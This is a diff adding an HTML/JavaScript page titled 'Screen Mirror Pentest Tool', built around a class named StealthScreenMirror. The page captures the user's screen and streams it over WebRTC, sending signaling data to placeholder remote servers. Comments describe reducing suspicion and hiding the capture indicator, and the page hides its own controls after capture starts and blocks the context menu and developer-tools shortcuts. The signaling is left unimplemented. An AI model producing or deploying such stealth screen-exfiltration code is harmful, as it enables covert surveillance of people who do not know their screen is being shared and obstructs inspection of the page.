@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Screen Mirror Pentest Tool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #000;
+            color: #fff;
+            overflow: hidden;
+            height: 100vh;
+        }
+        
+        #container {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+        }
+        
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: #111;
+        }
+        
+        #controls {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            z-index: 1000;
+            display: flex;
+            gap: 10px;
+        }
+        
+        button {
+            padding: 8px 16px;
+            background: #333;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        
+        button:hover {
+            background: #555;
+        }
+        
+        button.active {
+            background: #0a84ff;
+        }
+        
+        #status {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            font-size: 12px;
+            color: #aaa;
+        }
+        
+        #viewer-url {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.8);
+            padding: 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 11px;
+            max-width: 300px;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <video id="video" autoplay playsinline muted></video>
+        <div id="viewer-url"></div>
+        <div id="controls">
+            <button id="startBtn">Start Capture</button>
+            <button id="stopBtn" disabled>Stop</button>
+            <button id="copyUrl">Copy Viewer URL</button>
+        </div>
+        <div id="status">Ready for screen capture</div>
+    </div>
+
+    <script>
+        class StealthScreenMirror {
+            constructor() {
+                this.video = document.getElementById('video');
+                this.startBtn = document.getElementById('startBtn');
+                this.stopBtn = document.getElementById('stopBtn');
+                this.copyBtn = document.getElementById('copyUrl');
+                this.status = document.getElementById('status');
+                this.viewerUrl = document.getElementById('viewer-url');
+                
+                this.stream = null;
+                this.peerConnection = null;
+                this.channel = null;
+                this.serverUrl = null;
+                
+                this.init();
+            }
+            
+            async init() {
+                // Generate unique room ID
+                this.roomId = 'screen_' + Math.random().toString(36).substr(2, 9);
+                this.serverUrl = `https://your-pentest-server.com/view/${this.roomId}`; // Replace with your WebRTC signaling server
+                
+                this.viewerUrl.textContent = `Viewer: ${this.serverUrl}`;
+                
+                this.startBtn.onclick = () => this.startCapture();
+                this.stopBtn.onclick = () => this.stopCapture();
+                this.copyBtn.onclick = () => this.copyViewerUrl();
+                
+                // Auto-hide controls after 5 seconds
+                setTimeout(() => {
+                    document.getElementById('controls').style.opacity = '0.3';
+                    document.getElementById('controls').style.transition = 'opacity 0.3s';
+                }, 5000);
+            }
+            
+            async startCapture() {
+                try {
+                    this.status.textContent = 'Requesting screen access...';
+                    
+                    // Stealth getDisplayMedia - no audio, screen only
+                    this.stream = await navigator.mediaDevices.getDisplayMedia({
+                        video: {
+                            mediaSource: 'screen',
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 },
+                            frameRate: { ideal: 30, max: 60 }
+                        },
+                        audio: false // No audio to reduce suspicion
+                    });
+                    
+                    this.video.srcObject = this.stream;
+                    
+                    // Hide capture indicator by constraining video
+                    this.video.style.display = 'block';
+                    
+                    // Start WebRTC peer connection for remote viewing
+                    await this.initWebRTC();
+                    
+                    this.startBtn.disabled = true;
+                    this.stopBtn.disabled = false;
+                    this.startBtn.classList.remove('active');
+                    this.stopBtn.classList.add('active');
+                    
+                    this.status.textContent = 'Screen mirroring active - Viewer URL ready';
+                    
+                    // Auto-hide controls completely
+                    setTimeout(() => {
+                        document.getElementById('controls').style.display = 'none';
+                        this.viewerUrl.style.display = 'none';
+                    }, 3000);
+                    
+                } catch (err) {
+                    this.status.textContent = `Error: ${err.message}`;
+                    console.error('Capture failed:', err);
+                }
+            }
+            
+            async initWebRTC() {
+                // Simple WebRTC setup for screen streaming
+                this.peerConnection = new RTCPeerConnection({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+                
+                // Add screen stream to peer connection
+                this.stream.getTracks().forEach(track => {
+                    this.peerConnection.addTrack(track, this.stream);
+                });
+                
+                // Handle ICE candidates
+                this.peerConnection.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        // Send to signaling server (implement your signaling)
+                        this.sendSignaling({ candidate: event.candidate });
+                    }
+                };
+                
+                // Create offer for viewer
+                const offer = await this.peerConnection.createOffer();
+                await this.peerConnection.setLocalDescription(offer);
+                
+                // Send offer to signaling server
+                this.sendSignaling({ offer: offer });
+            }
+            
+            sendSignaling(data) {
+                // Implement your WebRTC signaling server POST
+                fetch('https://your-signaling-server.com/signal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        room: this.roomId,
+                        data: data
+                    })
+                }).catch(console.error);
+            }
+            
+            async stopCapture() {
+                if (this.stream) {
+                    this.stream.getTracks().forEach(track => track.stop());
+                    this.video.srcObject = null;
+                }
+                
+                if (this.peerConnection) {
+                    this.peerConnection.close();
+                }
+                
+                this.startBtn.disabled = false;
+                this.stopBtn.disabled = true;
+                this.startBtn.classList.add('active');
+                this.stopBtn.classList.remove('active');
+                
+                document.getElementById('controls').style.display = 'flex';
+                this.viewerUrl.style.display = 'block';
+                
+                this.status.textContent = 'Screen capture stopped';
+            }
+            
+            copyViewerUrl() {
+                navigator.clipboard.writeText(this.serverUrl).then(() => {
+                    this.status.textContent = 'Viewer URL copied!';
+                    setTimeout(() => {
+                        this.status.textContent = 'Screen mirroring active';
+                    }, 2000);
+                });
+            }
+        }
+        
+        // Initialize when page loads
+        window.addEventListener('load', () => {
+            new StealthScreenMirror();
+        });
+        
+        // Prevent context menu and dev tools
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.onkeydown = (e) => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+            }
+        };
+    </script>
+</body>
+</html>
